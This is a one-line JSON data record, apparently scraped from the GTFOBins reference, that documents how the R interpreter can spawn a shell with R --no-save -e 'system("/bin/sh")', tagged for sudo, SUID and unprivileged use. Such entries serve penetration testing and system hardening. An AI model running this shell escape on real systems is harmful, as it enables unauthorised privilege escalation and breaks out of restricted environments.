@@ -1,0 +1,1 @@
+{"title": "R", "source": "gtfobins", "source_label": "GTFOBins", "path": "r", "html": "<h1>R</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">R --no-save -e &#x27;system(&quot;/bin/sh&quot;)&#x27;</code></pre>", "excerpt": "R Shell R --no-save -e &#x27;system(&quot;/bin/sh&quot;)&#x27;", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
